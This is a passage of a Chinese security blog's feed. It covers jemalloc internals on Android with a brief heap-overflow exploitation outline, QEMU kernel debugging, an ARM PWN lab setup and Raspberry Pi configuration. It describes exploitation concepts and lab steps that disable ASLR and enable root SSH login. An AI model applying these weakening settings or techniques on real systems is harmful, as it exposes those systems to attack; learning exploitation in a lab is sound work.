            <span style="color:#e6db74">&#34;-DJEMALLOC_TCACHE&#34;</span>,
            <span style="color:#e6db74">&#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8&#34;</span>,
            <span style="color:#e6db74">&#34;-DANDROID_TCACHE_NSLOTS_LARGE=16&#34;</span>,
        ],
    },
}
</code></pre></div><p>用shadow查看arenas</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403015253.png" alt=""></p>
<h5 id="chunk">chunk</h5>
<p>一个arena下会有若干个chunk，Android 7之前chunk为256k，之后32位系统改为512k，64位系统改为2MB。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403012241.png" alt=""></p>
<p>每个chunk都有一个chunk head 包含着这个chunk的元数据（metadata）.Android 7之后元数据增加了mapbias与mapbits flags。</p>
<p>chunk是存放run的容器，大小固定相同，操作系统返回的内存被划分到chunk中管理</p>
<p>chunk中的元数据结构，mapbit[0]与mapmisc[0]指向chunk中的第一个run：</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403012851.png" alt=""></p>
<p>chunk元数据中mapmisc中的bitmap结构管理着run中的region的分配使用：</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403013355.png" alt="chunk"></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403015412.png" alt=""></p>
<h5 id="run">run</h5>
<p>run是存放连续的大小相同的region的容器，每个chunk中会包含若干个run，而run的metadata会存放在chunk的header当中，这样region里只存放数据本身，不再有内存属性说明。</p>
<h5 id="region">region</h5>
<p>region是最小的存储单元，每个run里面的region大小完全相同，也没有元数据，malloc实际返回的是region的地址。</p>
<h5 id="bins">bins</h5>
<p>jemalloc也用bin来管理内存，共有39个bins。bin的metadata存放于arena的header中，39个bin还会存放当前正在使用的run。所有带有空闲region的run和闲置的chunk信息会被放置在红黑树结构当中，这样寻找空闲内存的复杂度可以控制在o(log(n))。</p>
<h5 id="tcache">tcache</h5>
<p>为了优化多线程性能，jemalloc还采用了LIFO结构的tcache，存放近期被释放的region，每个线程的每个bin都对应一个tcache，存放在tcache中的内存并不会设置free标记位，并且由于tache附着于线程本身，使得大部分情况下从tcache分配内存时完全无需lock。</p>
<p>当jemalloc新分配一块内存是发现tcache为空，会触发prefill事件，此时jemalloc会将单前的arena上lock,并从当前run中取出一定数量的region存入tcache，保证tcache不为空。</p>
<p>当tcache满了（small bin是8，larger bin是20）的时候，会触发flush 事件，会释放部分region，并且才会被标记为已释放。这时这些region才能被其他线程自由分配。</p>
<p>此外，jemalloc也实现是GC机制。会有一个计数器统计申请和释放，达到阈值之后会触发特别的事件，目标bin里的tcache的四分之三的region会被释放掉。下次GC时会轮到下一个bin。这是可以从tcache中删除region并使其恢复常规可用性的另一种方法。</p>
<h5 id="分配流程">分配流程</h5>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403022314.png" alt=""></p>
<blockquote>
<ul>
<li>计算申请内存大小</li>
<li>从当前线程的tcache中找到合适的bin</li>
<li>如果tcache为空，就从当前的run中prefill一些region进来</li>
<li>如果当前run耗尽，就从低地址开始找到第一个非空run</li>
<li>如果现有run里没有足够的内存就分配一个新run</li>
<li>如果chunk里没有空间了就分配一个新chunk，同时分配新run并prefill一些region到tcache</li>
</ul>
</blockquote>
<h3 id="0x02-shadow">0x02 shadow</h3>
<p>使用shadow查看Android中的内存布局，简单学习下shadow的使用</p>
<h4 id="查看arenas">查看arenas</h4>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403022557.png" alt=""></p>
<p>可以看到一共两个arenas，每个arena有36个bin，一共2个chunk。</p>
<h4 id="查看chunks">查看chunks</h4>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403023042.png" alt=""></p>
<p>单个chunk，查看chunk中的run</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403023253.png" alt=""></p>
<p>查看runs，会列出单前所有的run的详情 run_siez = region_size*no_regions</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403023401.png" alt=""></p>
<p>只显示单前运行中的run</p>
<p>是否是allocated状态是根据arena_chunk_map_bits_s  对应 bits的 第 [0] bit 来确定 这里jemalloc5 和 jemalloc4 3不一样。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403023454.png" alt=""></p>
<p>查看单个run的详情：</p>
<p><img src="D:%5CProject%5CBLOG%5Cblog%5Ccontent%5Cpost%5Cimg%5Cimage-20200403023549875.png" alt="image-20200403023549875"></p>
<p>run的布局如下：</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200405030548.png" alt=""></p>
<p>源代码arena.h中有很多关于bits之类的注释。能够帮助理解。</p>
<p>查看bins:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> arena_bin_s {
    malloc_mutex_t         lock;    
    arena_run_t            <span style="color:#f92672">*</span>runcur;
    arena_run_heap_t       runs; <span style="color:#75715e">//4之前版本为arena_run_tree_t 类型
</span><span style="color:#75715e"></span>    malloc_bin_stats_t     stats; <span style="color:#75715e">//统计信息
</span><span style="color:#75715e"></span>}
</code></pre></div><p><strong>runcur:</strong> 当前可用于分配的run, 一般情况下指向地址最低的non-full run, 同一时间一个bin只有一个current run用于分配.</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403023802.png" alt=""></p>
<p>看别人的文章说是除去0号bin以外没4个bin为一组，组内size差一样，但是在这里可以看到每8个为一组，01-8号bin的size差值都为0x10,算是第一组，那第二组就为9-12号，只有4个bin size差值为0x20,但是有的为空，算第二组。没两组之间的差值2倍。以此类推，后面每4个为一组。</p>
<p>划分为{0}、{1-8}、{9-12}、{13-16}····· 可能不同版本会有区别。</p>
<p>查看regions [换了一个进程]</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200405031010.png" alt=""></p>
<p>大小都是0x8</p>
<p>按大小查找：第4个：</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200405031343.png" alt=""></p>
<p>tchche查看：</p>
<p>tcache的定义：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> tcache_bin_info_s {
	<span style="color:#66d9ef">unsigned</span>	ncached_max;	<span style="color:#75715e">/* Upper limit on ncached. */</span>
};

<span style="color:#66d9ef">struct</span> tcache_bin_s {
	tcache_bin_stats_t tstats;
	<span style="color:#66d9ef">int</span>		low_water;	<span style="color:#75715e">/* Min # cached since last GC. */</span>
	<span style="color:#66d9ef">unsigned</span>	lg_fill_div;	<span style="color:#75715e">/* Fill (ncached_max &gt;&gt; lg_fill_div). */</span>
	<span style="color:#66d9ef">unsigned</span>	ncached;	<span style="color:#75715e">/* # of cached objects. */</span>
	<span style="color:#75715e">/*
</span><span style="color:#75715e">	 * To make use of adjacent cacheline prefetch, the items in the avail
</span><span style="color:#75715e">	 * stack goes to higher address for newer allocations.  avail points
</span><span style="color:#75715e">	 * just above the available space, which means that
</span><span style="color:#75715e">	 * avail[-ncached, ... -1] are available items and the lowest item will
</span><span style="color:#75715e">	 * be allocated first.
</span><span style="color:#75715e">	 */</span>
	<span style="color:#66d9ef">void</span>		<span style="color:#f92672">**</span>avail;	<span style="color:#75715e">/* Stack of available objects. */</span>
};
<span style="color:#66d9ef">struct</span> tcache_s {
	ql_elm(tcache_t) link;		<span style="color:#75715e">/* Used for aggregating stats. */</span>
	uint64_t	prof_accumbytes;<span style="color:#75715e">/* Cleared after arena_prof_accum(). */</span>
	ticker_t	gc_ticker;	<span style="color:#75715e">/* Drives incremental GC. */</span>
	szind_t		next_gc_bin;	<span style="color:#75715e">/* Next bin to GC. */</span>
	tcache_bin_t	tbins[<span style="color:#ae81ff">1</span>];	<span style="color:#75715e">/* Dynamically sized. */</span>
	<span style="color:#75715e">/*
</span><span style="color:#75715e">	 * The pointer stacks associated with tbins follow as a contiguous
</span><span style="color:#75715e">	 * array.  During tcache initialization, the avail pointer in each
</span><span style="color:#75715e">	 * element of tbins is initialized to point to the proper offset within
</span><span style="color:#75715e">	 * this array.
</span><span style="color:#75715e">	 */</span>
};
<span style="color:#66d9ef">struct</span> tcaches_s {
	<span style="color:#66d9ef">union</span> {
		tcache_t	<span style="color:#f92672">*</span>tcache;
		tcaches_t	<span style="color:#f92672">*</span>next;
	};
};
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20200405034722.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200405034659.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200405190426.png" alt=""></p>
<h3 id="0x03-利用">0x03 利用</h3>
<h5 id="堆溢出">堆溢出</h5>
<p>一般先利用gadget 绕过ASLR，再利用gadget拿到代码执行的权限，只要能执行代码就能逃出sandboxing或者摆脱selinux。</p>
<ul>
<li>Small region overflow</li>
</ul>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200405190147.png" alt=""></p>
<ul>
<li>Run overflow</li>
</ul>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200405190224.png" alt=""></p>
<ul>
<li>Chunk overflow</li>
</ul>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200405190305.png" alt=""></p>
<h3 id="总结">总结</h3>
<p>后面还是得使用shadow工具具体调试CVE加深理解。</p>
<p>jemalloc新版与旧版有挺多区别，之后想要深入了解jemalloc的细节以及一些实现还是得看看源码。</p>
<h4 id="参考">参考</h4>
<ul>
<li><a href="https://github.com/jemalloc/jemalloc">https://github.com/jemalloc/jemalloc</a></li>
<li><a href="https://blog.csdn.net/txx_683/article/details/53468211">https://blog.csdn.net/txx_683/article/details/53468211</a></li>
<li><a href="https://blog.nsogroup.com/a-tale-of-two-mallocs-on-android-libc-allocators-part-2-jemalloc/">https://blog.nsogroup.com/a-tale-of-two-mallocs-on-android-libc-allocators-part-2-jemalloc/</a></li>
<li><a href="https://www.anquanke.com/post/id/149132#h3-5">https://www.anquanke.com/post/id/149132#h3-5</a></li>
<li><a href="https://www.anquanke.com/post/id/85982">https://www.anquanke.com/post/id/85982</a></li>
<li>dlmalloc 的一个tools: <a href="https://github.com/s1341/shade">shade</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Qemu&#43;gdb调试Linux内核</title>
            <link>https://kuekiko.top/posts/2019/08/qemu-gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/</link>
            <pubDate>Wed, 28 Aug 2019 23:24:18 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/08/qemu-gdb%E8%B0%83%E8%AF%95linux%E5%86%85%E6%A0%B8/</guid>
            <description>前言 调试Linux内核可以使用VM双机调试，不过使用qemu来调试会更加方便。
环境搭建 编译源码 首先到Linux FTP仓库或者官网下载对应版本的源码。
这里下载的是linux-4.10.10
解压tar -xvJf linux-4.10.10.tar.xz
安装依赖
sudo apt install build-essential ncurses-dev xz-utils libssl-dev bc fakeroot aptitude libncurses5-dev​ sudo apt install qemu编译内核 make menuconfig进行配置：KernelHacking —&amp;gt; Compile-time checks and compiler options选中
Compile the kernel with debug infoCompile the kernel with frame pointersProvide GDB scripts for kernel debuggingProcessor type and features→去掉Paravirtualized guest support保存退出。
命令make -jN 进行编译
之后make all
make modules编译完成之后，vmlinux在源码根目录、bzImage在./arch/x86/boot/下</description>
            <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>调试Linux内核可以使用VM双机调试，不过使用qemu来调试会更加方便。</p>
<h3 id="环境搭建">环境搭建</h3>
<h4 id="编译源码">编译源码</h4>
<p>首先到Linux <a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/">FTP仓库</a>或者<a href="https://www.kernel.org/">官网</a>下载对应版本的源码。</p>
<p>这里下载的是<code>linux-4.10.10</code></p>
<p>解压<code>tar -xvJf linux-4.10.10.tar.xz</code></p>
<p>安装依赖</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    sudo apt install build-essential ncurses-dev xz-utils libssl-dev bc fakeroot aptitude libncurses5-dev

​    sudo apt install qemu
</code></pre></div><h4 id="编译内核">编译内核</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    make menuconfig
</code></pre></div><p><img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828152106.png" alt=""></p>
<p>进行配置：<code>KernelHacking</code> —&gt;  <code>Compile-time checks and compiler options</code>选中</p>
<pre><code>Compile the kernel with debug info
</code></pre><pre><code>Compile the kernel with frame pointers
</code></pre><pre><code>Provide GDB scripts for kernel debugging
</code></pre><pre><code>Processor type and features→去掉Paravirtualized guest support
</code></pre><p>保存退出。</p>
<p>命令<code>make -jN</code> 进行编译</p>
<p>之后<code>make all</code></p>
<pre><code>make modules
</code></pre><p>编译完成之后，<code>vmlinux</code>在源码根目录、<code>bzImage</code>在<code>./arch/x86/boot/</code>下</p>
<h4 id="构建initramfs根文件系统">构建initramfs根文件系统</h4>
<p>借助BusyBox构建极简initramfs，busybox最新版<a href="https://busybox.net/downloads/">下载地址</a></p>
<p>编译静态版Busybox</p>
<pre><code>make menuconfig
</code></pre><p><img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828160608.png" alt=""></p>
<p>设置以下选项：</p>
<p>Settings -&gt; Build Options -&gt; Build static binary (no shared libs) 编译成静态文件</p>
<p>开始编译：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">make -jN
make install 
</code></pre></div><p>等待编译完成源码目录下出现<code>_install</code>目录，进行配置：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    cd _install

​    mkdir proc sys dev etc etc/init.d

​    vim etc/init.d/rcS

​    <span style="color:#ae81ff">\#</span> 文件中的内容如下

​    <span style="color:#ae81ff">\#</span> <span style="color:#75715e">#!/bin/sh</span>

​    <span style="color:#ae81ff">\#</span> mount -t proc none /proc

​    <span style="color:#ae81ff">\#</span> mount -t sysfs none /sys

​    <span style="color:#ae81ff">\#</span> /sbin/mdev -s

​    chmod +x etc/init.d/rcS
</code></pre></div><p>创建文件系统</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . | cpio -o --format<span style="color:#f92672">=</span>newc &gt; ../rootfs.img
</code></pre></div><h4 id="运行内核">运行内核</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    qemu-system-x86_64 <span style="color:#ae81ff">\</span>

​    -kernel ~/linux-4.10.10/arch/x86_64/boot/bzImage <span style="color:#ae81ff">\</span>

​    -initrd ~/busybox-1.31.0/rootfs.img <span style="color:#ae81ff">\</span>

​    -append <span style="color:#e6db74">&#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34;</span> <span style="color:#ae81ff">\</span>

​    -cpu kvm64,+smep,+smap <span style="color:#ae81ff">\</span>

​    -nographic <span style="color:#ae81ff">\</span>

​    -gdb tcp::1234
</code></pre></div><p>**<code>-**cpu kvm64,**+**smep,**+**smap</code> 设置CPU的安全选项，这里开启了smap和smep</p>
<p>**<code>-**kernel</code> 设置内核bzImage文件的路径</p>
<p>**<code>-**initrd</code> 设置刚才利用busybox创建的rootfs.img，作为内核启动的文件系统</p>
<p>**<code>-**gdb tcp::1234</code> 设置gdb的调试端口为1234 在GDB中通过 target remote localhist:1234进行连接</p>
<h4 id="驱动">驱动</h4>
<p><code>insmod</code> 加载驱动</p>
<p><code>rmmod</code> 卸载驱动</p>
<p><code>lsmod</code> 查看加载了的驱动</p>
<h3 id="调试测试">调试测试</h3>
<p>qemu启动，启动后的界面</p>
<p><img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828162012.png" alt=""></p>
<p>启动GDB</p>
<p><img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828164008.png" alt=""></p>
<p><img src="https://my-md.oss-cn-shenzhen.aliyuncs.com/20190828164103.png" alt=""></p>
<p>使用内核提供的GDB辅助调试功能：(gdb)apropos lx</p>
<p>调试内核模块：add-symbol-file 添加模块文件</p>
<p>断点测试 <code>b cmdline_proc_show</code></p>
<p><code>cat /proc/cmdline</code> 触发断点</p>
<h3 id="引用">引用</h3>
]]></content>
        </item>
        
        <item>
            <title>ARM-PWN从入门到放弃0x00-环境准备</title>
            <link>https://kuekiko.top/posts/2019/08/arm-pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%830x00-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</link>
            <pubDate>Sat, 03 Aug 2019 12:26:24 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/08/arm-pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%830x00-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</guid>
            <description>0x00 前言 学PWN也有一段时间了，x86/x86_64 下算是入了个门，平时接触ARM比较多，正好以ARM架构下再更加深入的学习PWN。
会用的工具、环境：
 在Ubuntu 18.04/WSL2 Docker for wsl2 树莓派3B+ qemu unicorn IDA Radare2 GDB+gef+pwndbg+peda pwntools  0x01 环境安装 这里选用的有两种环境
  ARM设备 树莓派
之前618买了树莓派，派上用场了。
把PI的官方系统换成了Ubuntu 18.04。
安装了GCC 、gdb、gef（经测试只有gef能用），其他也没什么需要装的。
关闭地址随机化
sudo cat /proc/sys/kernel/randomize_va_space # 状态查看2 # 开启中sudo echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space bash: /proc/sys/kernel/randomize_va_space: Permission deniedsuecho 0 &amp;gt; /proc/sys/kernel/randomize_va_spacecat /proc/sys/kernel/randomize_va_space0 #这就OK  QEMU 模拟 (WSL2)
安装
#防止又出什么乱七八糟的错误和需求，尽量都装上apt install gdb gdb-multiarch ##apt install qemu ##apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu ##gcc arm 依赖库安装  0x02 启动和调试   树莓派</description>
            <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3>
<p>学PWN也有一段时间了，x86/x86_64 下算是入了个门，平时接触ARM比较多，正好以ARM架构下再更加深入的学习PWN。</p>
<p>会用的工具、环境：</p>
<ul>
<li>在Ubuntu 18.04/WSL2</li>
<li>Docker for wsl2</li>
<li>树莓派3B+</li>
<li>qemu</li>
<li>unicorn</li>
<li>IDA</li>
<li>Radare2</li>
<li>GDB+gef+pwndbg+peda</li>
<li>pwntools</li>
</ul>
<h3 id="0x01-环境安装">0x01 环境安装</h3>
<p>这里选用的有两种环境</p>
<ol>
<li>
<p>ARM设备 树莓派</p>
<p>之前618买了树莓派，派上用场了。</p>
<p>把PI的官方系统换成了Ubuntu 18.04。</p>
<p>安装了GCC 、gdb、gef（经测试只有gef能用），其他也没什么需要装的。</p>
<p>关闭地址随机化</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo cat /proc/sys/kernel/randomize_va_space <span style="color:#75715e"># 状态查看</span>
<span style="color:#ae81ff">2</span> <span style="color:#75715e"># 开启中</span>
sudo echo <span style="color:#ae81ff">0</span> &gt; /proc/sys/kernel/randomize_va_space 
bash: /proc/sys/kernel/randomize_va_space: Permission denied
su
echo <span style="color:#ae81ff">0</span> &gt; /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space
<span style="color:#ae81ff">0</span> <span style="color:#75715e">#这就OK</span>
</code></pre></div></li>
<li>
<p>QEMU 模拟 (WSL2)</p>
<p>安装</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#防止又出什么乱七八糟的错误和需求，尽量都装上</span>
apt install gdb gdb-multiarch <span style="color:#75715e">##</span>
apt install qemu <span style="color:#75715e">##</span>
apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu <span style="color:#75715e">##gcc arm 依赖库安装</span>
</code></pre></div></li>
</ol>
<h3 id="0x02-启动和调试">0x02 启动和调试</h3>
<ol>
<li>
<p>树莓派</p>
<p>直接运行</p>
<p>进行socat绑定端口 就OK</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat tcp-listen:6666,fork exec:./binfile
</code></pre></div></li>
<li>
<p>QEMU</p>
<ul>
<li>32bit</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 本地GDB调试</span>
qemu-arm -g <span style="color:#ae81ff">1234</span> -L /usr/arm-linux-gnueabi ./binfile
gdb-multiarch
target remote localhost:1234
<span style="color:#75715e"># 绑定运行到指定端口 远程调试</span>
socat tcp-l:10002,fork exec:<span style="color:#e6db74">&#34;qemu-arm  -L /usr/arm-linux-gnueabi ./binfile&#34;</span>,reuseaddr &amp;
<span style="color:#75715e"># + -g 方便调试</span>  
socat tcp-l:10002,fork exec:<span style="color:#e6db74">&#34;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./binfile&#34;</span>,reuseaddr &amp;
</code></pre></div><ul>
<li>64bit</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># 本地调试 -g 等待GDB调试</span>
qemu-aarch64 -g <span style="color:#ae81ff">1111</span> -L /usr/aarch64-linux-gnu ./file
socat tcp-l:10002,fork exec:<span style="color:#e6db74">&#34;qemu-aarch64  -L /usr/aarch64-linux-gnu ./binfile&#34;</span>,reuseaddr &amp;
socat tcp-l:10002,fork exec:<span style="color:#e6db74">&#34;qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./binfile&#34;</span>,reuseaddr &amp;
</code></pre></div></li>
</ol>
<h3 id="0x03-调试过程">0x03 调试过程</h3>
<p>在树莓派直接gdb调试就行。省略。。。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190804221031.png" alt="img"></p>
<p>使用qemu+gdb-multiarch+插件进行调试步骤</p>
<p><code>qemu-aarch64 -g 10002 -L /usr/aarch64-linux-gnu ./baby_arm</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-multiarch ./baby_arm -q
target remote:10002
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190804225625.png" alt="img"></p>
<h3 id="0x04-题目搭建">0x04 题目搭建</h3>
<p>基于<a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a>项目自己改了一个</p>
<p>地址：<a href="https://github.com/Vorblock/CTF_arm_xinetd">CTF_ARM_xinetd</a></p>
<h3 id="0x05-参考链接">0x05 参考链接</h3>
<ul>
<li><a href="https://xz.aliyun.com/t/3154">https://xz.aliyun.com/t/3154</a></li>
<li><a href="https://github.com/Eadom/ctf_xinetd">https://github.com/Eadom/ctf_xinetd</a></li>
<li><a href="https://github.com/bkerler/exploit_me">https://github.com/bkerler/exploit_me</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Raspberry Pi 3B&#43; 0安装使用</title>
            <link>https://kuekiko.top/posts/2019/06/raspberry-pi-3b-0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</link>
            <pubDate>Sun, 23 Jun 2019 01:14:22 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2019/06/raspberry-pi-3b-0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</guid>
            <description>Raspberry Pi 3B+ 0安装使用 0x00 购买 终于下手买了。打算用来学习ARM、以及一些硬件的知识。
 3B+ 裸机 32G SD card 散热片 保护壳  0x01 安装系统 首先下载系统镜像。
官网有挺多系统可以选择，这里选择了安装Raspbian desktop最新版
之后打算装Lite版，手上没有多余的显示器。而且桌面版占用很高。
迅雷，3分钟搞定。
其次开始向SD卡中写镜像。
买的32G闪迪的高速卡，现在32G都白菜价了，想想几年前16G的死贵。
官方教程用的是Etcher ，也可以用Win32DiskImager。这里省事还是用Etcher。
步骤
 下载etcher.io安装包安装Etcher](https://etcher.io/) 运行Etcher,选择镜像和sd卡  Flash一键搞定。  0x02 配置 系统安装完，开始进行配置。
先连上显示器看看
然而平时显示器还是要连笔记本，而且这分辨率好糊。所以还是配ssh和VNC连接使用吧。
 修改源  # 编辑 `/etc/apt/sources.list` 文件，删除原文件所有内容，用以下内容取代：deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contribdeb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib# 编辑 `/etc/apt/sources.list.d/raspi.list` 文件，删除原文件所有内容，用以下内容取代：deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ stretch mainsudo apt update
 拓展SD卡  sudo raspi-config -&amp;gt; Advanced Opt -&amp;gt; A1 Expand Filesystem</description>
            <content type="html"><![CDATA[<h2 id="raspberry-pi-3b-0安装使用">Raspberry Pi 3B+ 0安装使用</h2>
<h3 id="0x00-购买">0x00 购买</h3>
<p>终于下手买了。打算用来学习ARM、以及一些硬件的知识。</p>
<ul>
<li>3B+ 裸机</li>
<li>32G SD card</li>
<li>散热片</li>
<li>保护壳</li>
</ul>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623005746.png" alt=""></p>
<h3 id="0x01-安装系统">0x01 安装系统</h3>
<p>首先下载系统镜像。</p>
<p>官网有挺多系统可以选择，这里选择了安装<a href="https://www.raspberrypi.org/downloads/">Raspbian</a> desktop最新版</p>
<p>之后打算装Lite版，手上没有多余的显示器。而且桌面版占用很高。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190622221745.png" alt=""></p>
<p>迅雷，3分钟搞定。</p>
<p>其次开始向SD卡中写镜像。</p>
<p>买的32G闪迪的高速卡，现在32G都白菜价了，想想几年前16G的死贵。</p>
<p>官方教程用的是<a href="https://etcher.io/">Etcher</a> ，也可以用<a href="https://sourceforge.net/projects/win32diskimager/">Win32DiskImager</a>。这里省事还是用Etcher。</p>
<p>步骤</p>
<ol>
<li>下载<a href="https://etcher.io/">etcher.io</a>安装包安装Etcher](<a href="https://etcher.io/">https://etcher.io/</a>)</li>
<li>运行Etcher,选择镜像和sd卡</li>
</ol>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190622222523.png" alt=""></p>
<ol start="3">
<li>Flash一键搞定。</li>
</ol>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190622223043.png" alt=""></p>
<h3 id="0x02-配置">0x02 配置</h3>
<p>系统安装完，开始进行配置。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623003205.png" alt=""></p>
<p>先连上显示器看看</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623003758.png" alt=""></p>
<p>然而平时显示器还是要连笔记本，而且这分辨率好糊。所以还是配ssh和VNC连接使用吧。</p>
<ul>
<li>修改源</li>
</ul>
<pre><code># 编辑 `/etc/apt/sources.list` 文件，删除原文件所有内容，用以下内容取代：
deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib
deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib

# 编辑 `/etc/apt/sources.list.d/raspi.list` 文件，删除原文件所有内容，用以下内容取代：
deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ stretch main
</code></pre><p><code>sudo apt update</code></p>
<ul>
<li>拓展SD卡</li>
</ul>
<p><code>sudo raspi-config</code>  -&gt; Advanced Opt -&gt;  A1 Expand Filesystem</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623140154.png" alt=""></p>
<ul>
<li>ssh 配置</li>
</ul>
<p>最新版系统直接想要的接口打开就OK</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623004049.png" alt=""></p>
<p>允许root登陆，修改<code>/etc/ssh/sshd.conf</code> 下的<code>PermitRootLogin yes</code>
<code>StrictModes yes</code> 就ok。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623004313.png" alt=""></p>
<ul>
<li>VNC</li>
</ul>
<p>win10下载<a href="https://www.realvnc.com">vnc客户端</a></p>
<p>RaspberryPI 命令开启server:<code>vncserver</code></p>
<p>连接成功：</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623004603.png" alt=""></p>
<p>连接出现分辨率问题</p>
<p>设置分辨率：命令<code>sudo raspi-config</code>-&gt;Advanced Opt -&gt;Resolution选择分辨率。重启就完事。</p>
<h3 id="0x04-硬件检查">0x04 硬件检查</h3>
<ol>
<li>系统镜像版本号</li>
</ol>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623005614.png" alt=""></p>
<ol start="2">
<li>板子型号：</li>
</ol>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190623005511.png" alt=""></p>
<ol start="3">
<li><strong>系统固件版本号</strong></li>
</ol>
